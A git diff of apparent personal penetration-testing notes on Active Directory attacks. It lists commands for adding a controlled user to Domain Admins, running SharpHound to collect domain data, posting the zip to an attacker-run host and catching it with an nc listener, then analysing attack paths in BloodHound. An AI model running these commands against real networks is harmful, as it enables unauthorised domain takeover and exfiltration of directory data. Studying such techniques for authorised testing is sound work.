@@ -41,6 +41,34 @@ Get-NetGroup \n
   / net group "Domain Admins" $username(which you controlled)  /add /domain
     / net group "Domain Admins" $username(which you controlled)  /del /domain
   
+### sharphound    /sharphound to collect info, send to host, bloodhound to view the result
+  / /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
+  Import-Module .\SharpHound
+
+  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\ -OutputPrefix "$name"  /a file.zip will be created. 
+
+  Invoke-RestMethod -Uri $serveruri  -Method Post -InFile #dir -UserDefaultCredentials
+
+  nc -nvlp $port > name.zip
+
+  ####neo4j   for bloodhound
+    $sudo neo4j start
+
+    $bloodhound
+      upload the .zip==> analysis ==> shortest paths
+          match (m:Computer) return m , or m:User
+          then mark a cimputeror user as owned. click shortest path from owned priciplals
+          right click the connection to view the suggestions.
+
+          
+        
+
+      
+
+    
+
+  
+  
   
 
   
